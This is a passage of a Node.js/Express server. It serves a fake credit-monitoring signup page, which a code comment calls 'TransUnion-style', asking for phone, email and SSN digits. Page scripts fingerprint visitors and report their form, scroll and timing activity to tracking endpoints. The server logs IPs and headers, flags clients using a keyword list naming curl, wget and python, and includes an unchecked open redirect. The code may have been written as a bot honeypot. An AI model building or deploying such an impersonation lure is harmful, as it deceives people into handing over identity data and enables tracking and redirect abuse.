                screen: {width: screen.width, height: screen.height},
                viewport: {width: window.innerWidth, height: window.innerHeight},
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                pageUrl: window.location.href,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            })
        }).catch(() => {});
        
        // Auto-advance phone inputs
        document.getElementById('phone1').addEventListener('input', function(e) {
            if (e.target.value.length === 3) {
                document.getElementById('phone2').focus();
            }
        });
        
        document.getElementById('phone2').addEventListener('input', function(e) {
            if (e.target.value.length === 3) {
                document.getElementById('phone3').focus();
            }
        });
        
        // Track form field interactions
        document.querySelectorAll('input').forEach(element => {
            element.addEventListener('focus', function() {
                fetch("/api/js-track/${trackingId}", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        action: "form_field_focus",
                        field: this.id,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {});
            });
            
            element.addEventListener('blur', function() {
                if (this.value) {
                    fetch("/api/js-track/${trackingId}", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            action: "form_field_filled",
                            field: this.id,
                            hasValue: !!this.value,
                            timestamp: new Date().toISOString()
                        })
                    }).catch(() => {});
                }
            });
        });
        
        function handleSubmit(event) {
            event.preventDefault();
            
            const phone = document.getElementById('phone1').value + 
                         document.getElementById('phone2').value + 
                         document.getElementById('phone3').value;
            const email = document.getElementById('email').value;
            const ssn = document.getElementById('ssn').value;
            
            // Track submission attempt
            fetch("/api/js-track/${trackingId}", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    action: "form_submission_attempt",
                    formData: {
                        phoneLength: phone.length,
                        hasEmail: !!email,
                        hasSsn: !!ssn
                    },
                    timestamp: new Date().toISOString()
                })
            }).catch(() => {});
            
            // Validate
            if (!email || ssn.length !== 4 || phone.length !== 10) {
                alert("Please fill in all required fields correctly.");
                return;
            }
            
            // Update progress
            document.querySelector('.progress-fill').style.width = '66%';
            document.querySelector('.step-indicator').textContent = 'Step 2: Verify Your Identity';
            
            // Track successful submission
            fetch("/api/js-track/${trackingId}", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    action: "step_completed",
                    step: 1,
                    timestamp: new Date().toISOString()
                })
            }).catch(() => {});
            
            alert("Thank you for your interest! To complete your free credit report signup, please verify your identity through our secure verification process.");
        }
        
        // Track scroll depth
        let maxScroll = 0;
        window.addEventListener('scroll', function() {
            const scrollPercent = Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100);
            if (scrollPercent > maxScroll) {
                maxScroll = scrollPercent;
                if (maxScroll % 25 === 0) {
                    fetch("/api/js-track/${trackingId}", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            action: "scroll_depth",
                            percentage: maxScroll,
                            timestamp: new Date().toISOString()
                        })
                    }).catch(() => {});
                }
            }
        });
        
        // Track time on page
        let timeOnPage = 0;
        setInterval(() => {
            timeOnPage += 10;
            if (timeOnPage % 30 === 0) {
                fetch("/api/js-track/${trackingId}", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            action: "time_on_page",
                            seconds: timeOnPage,
                            timestamp: new Date().toISOString()
                        })
                    }).catch(() => {});
            }
        }, 10000);
    </script>
</body>
</html>`;
}

// Extract tracking logic to reusable function
function handleTracking(req, res, trackingId) {
    const clientInfo = extractClientInfo(req);
    
    if (trackingData.has(trackingId)) {
        trackingData.get(trackingId).clicks.push(clientInfo);
        console.log('Bot interaction: ' + clientInfo.ip + ' - ' + clientInfo.userAgent);
    } else {
        console.log('Unknown tracking ID accessed: ' + trackingId);
    }
    
    saveInteraction(trackingId, clientInfo);
    
    const strategy = req.query.strategy || 'credit';
    
    switch (strategy) {
        case 'redirect':
            res.redirect(req.query.target || 'https://example.com');
            break;
            
        case 'pixel':
            res.set({
                'Content-Type': 'image/png',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'Expires': '0'
            });
            const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');
            res.send(pixel);
            break;
            
        case 'credit':
        default:
            res.send(generateCreditMonitoringHTML(trackingId));
            break;
    }
}

// Root path handler - redirect to a tracking link or show landing page
app.get('/', (req, res) => {
    // Create a default tracking ID for the root page
    const trackingId = generateTrackingId();
    const metadata = {
        created: new Date().toISOString(),
        description: 'Root landing page',
        campaign: 'direct',
        friendlyPath: 'home',
        urlType: 'root',
        clicks: [],
        createdBy: getClientIP(req)
    };
    trackingData.set(trackingId, metadata);
    
    // Show the TransUnion-style page
    res.send(generateCreditMonitoringHTML(trackingId));
});

// Friendly URL endpoints
app.get('/offer/:friendlyPath', (req, res) => {
    const friendlyPath = req.params.friendlyPath;
    const trackingId = findTrackingIdByPath(friendlyPath);
    
    if (trackingId) {
        handleTracking(req, res, trackingId);
    } else {
        res.status(404).send('Offer not found');
    }
});

app.get('/go/:friendlyPath', (req, res) => {
    const friendlyPath = req.params.friendlyPath;
    const trackingId = findTrackingIdByPath(friendlyPath);
    
    if (trackingId) {
        handleTracking(req, res, trackingId);
    } else {
        res.status(404).send('Link not found');
    }
});

app.get('/promo/:promoCode', (req, res) => {
    const promoCode = req.params.promoCode;
    const trackingId = findTrackingIdByPromo(promoCode) || 'promo-' + promoCode + '-' + Date.now();
    handleTracking(req, res, trackingId);
});

// Main tracking endpoint
app.get('/t/:id', (req, res) => {
    const trackingId = req.params.id;
    handleTracking(req, res, trackingId);
});

// JavaScript-based tracking endpoint
app.post('/api/js-track/:id', (req, res) => {
    const trackingId = req.params.id;
    const jsInfo = {
        timestamp: new Date().toISOString(),
        ip: getClientIP(req),
        type: 'javascript',
        data: req.body
    };
    
    if (trackingData.has(trackingId)) {
        trackingData.get(trackingId).clicks.push(jsInfo);
    }
    
    saveInteraction(trackingId, jsInfo);
    res.json({ success: true });
});

// Extract comprehensive client information
function extractClientInfo(req) {
    const ip = getClientIP(req);
    
    return {
        timestamp: new Date().toISOString(),
        ip: ip,
        userAgent: req.headers['user-agent'] || 'Unknown',
        referer: req.headers['referer'] || 'Direct',
        acceptLanguage: req.headers['accept-language'] || 'Unknown',
        acceptEncoding: req.headers['accept-encoding'] || 'Unknown',
        host: req.headers['host'],
        method: req.method,
        url: req.url,
        query: req.query,
        xForwardedFor: req.headers['x-forwarded-for'],
        xRealIp: req.headers['x-real-ip'],
        cfConnectingIp: req.headers['cf-connecting-ip'],
        isBot: detectBot(req.headers['user-agent'] || ''),
        botScore: calculateBotScore(req.headers)
    };
}

// Enhanced bot detection
function detectBot(userAgent) {
    const botKeywords = [
        'bot', 'crawler', 'spider', 'scraper', 'automated',
        'python', 'curl', 'wget', 'requests', 'selenium',
        'headless', 'phantom', 'zombie', 'mechanize'
    ];
    
    const ua = userAgent.toLowerCase();
    return botKeywords.some(keyword => ua.includes(keyword));
}

// Calculate bot probability score
function calculateBotScore(headers) {
    let score = 0;
    
    if (!headers['accept-language']) score += 20;
    if (!headers['accept-encoding']) score += 15;
    if (!headers['accept']) score += 10;
    
    const ua = (headers['user-agent'] || '').toLowerCase();
    if (ua.includes('python')) score += 30;
    if (ua.includes('curl')) score += 30;
    if (ua.includes('wget')) score += 30;
    if (ua === '') score += 25;
    
    if (headers['accept'] && headers['accept'].includes('*/*') && !headers['accept-language']) {
        score += 15;
    }
    
    return Math.min(score, 100);
}

// Save interaction to persistent log
function saveInteraction(trackingId, clientInfo) {
    const logEntry = {
        trackingId: trackingId,
        ip: clientInfo.ip,
        userAgent: clientInfo.userAgent,
        timestamp: clientInfo.timestamp,
        isBot: clientInfo.isBot,
        botScore: clientInfo.botScore
    };
    
    const logFile = path.join(__dirname, 'interactions.log');
    const logLine = JSON.stringify(logEntry) + '\n';
    
    fs.appendFile(logFile, logLine, (err) => {
        if (err) console.error('Failed to write log:', err);
    });
}

// Get tracking statistics
app.get('/api/stats/:id', requireAuth, (req, res) => {
    const trackingId = req.params.id;
    
    if (!trackingData.has(trackingId)) {
        return res.status(404).json({ error: 'Tracking ID not found' });
    }
    
    const data = trackingData.get(trackingId);
    const clicks = data.clicks || [];
    
    // Get last 50 clicks for detailed view
    const recentClicks = clicks.slice(-50).map(click => ({
        timestamp: click.timestamp,
        ip: click.ip,
        userAgent: click.userAgent || 'Unknown',
        referer: click.referer || 'Direct',
        acceptLanguage: click.acceptLanguage || 'Unknown',
        isBot: click.isBot || false,
        botScore: click.botScore || 0,
        type: click.type || 'page_visit'
    }));
    
    // Calculate top user agents
    const uaMap = {};
    clicks.forEach(click => {
        const ua = click.userAgent || 'Unknown';
        uaMap[ua] = (uaMap[ua] || 0) + 1;
    });
    
    const topUserAgents = Object.entries(uaMap)
        .sort(([,a], [,b]) => b - a)
        .slice(0, 10)
        .map(([ua, count]) => ({
            userAgent: ua.length > 60 ? ua.substring(0, 60) + '...' : ua,
            count: count
        }));
    
    res.json({
        trackingId: trackingId,
        created: data.created,
        description: data.description,
        campaign: data.campaign,
        totalClicks: clicks.length,
        uniqueIPs: [...new Set(clicks.map(c => c.ip))].length,
        botClicks: clicks.filter(c => c.isBot).length,
        humanClicks: clicks.filter(c => !c.isBot).length,
        avgBotScore: clicks.length > 0 ? 
            Math.round(clicks.reduce((sum, c) => sum + (c.botScore || 0), 0) / clicks.length) : 0,
        recentClicks: recentClicks,
        topUserAgents: topUserAgents,
        lastClick: clicks.length > 0 ? clicks[clicks.length - 1].timestamp : null
    });
});

// Helper functions for analytics
function getTopUserAgents(clicks) {
    const uaMap = {};
    clicks.forEach(click => {
        const ua = click.userAgent || 'Unknown';
        uaMap[ua] = (uaMap[ua] || 0) + 1;
    });
    
    return Object.entries(uaMap)
        .sort(([,a], [,b]) => b - a)
        .slice(0, 5)
        .map(([ua, count]) => ({userAgent: ua, count: count}));
}

function getClicksByHour(clicks) {
    const hourMap = {};
    clicks.forEach(click => {
        const hour = new Date(click.timestamp).getHours();
        hourMap[hour] = (hourMap[hour] || 0) + 1;
    });
    
    return hourMap;
}

// Get all tracking data
app.get('/api/dashboard', requireAuth, (req, res) => {
    const allStats = Array.from(trackingData.entries()).map(([id, data]) => {
        const clicks = data.clicks || [];
        const recentClicks = clicks.slice(-20);
        
        return {
            trackingId: id,
            shortId: id.substring(0, 8),
            created: data.created,
            description: data.description,
            campaign: data.campaign,
            friendlyPath: data.friendlyPath,
            urlType: data.urlType,
            totalClicks: clicks.length,
            uniqueIPs: [...new Set(clicks.map(c => c.ip))].length,
            botClicks: clicks.filter(c => c.isBot).length,
            humanClicks: clicks.filter(c => !c.isBot).length,
            lastClick: clicks.length > 0 ? clicks[clicks.length - 1].timestamp : null,
            recentClicks: recentClicks,
            avgBotScore: clicks.length > 0 ? 
                Math.round(clicks.reduce((sum, c) => sum + (c.botScore || 0), 0) / clicks.length) : 0
        };
    });
    
    const totalClicks = allStats.reduce((sum, s) => sum + s.totalClicks, 0);
    const totalBots = allStats.reduce((sum, s) => sum + s.botClicks, 0);
    
    res.json({
        totalLinks: allStats.length,
        totalClicks: totalClicks,
        totalBots: totalBots,
        totalHumans: totalClicks - totalBots,
        botPercentage: totalClicks > 0 ? Math.round((totalBots / totalClicks) * 100) : 0,
        links: allStats.sort((a, b) => new Date(b.created) - new Date(a.created))
    });
});
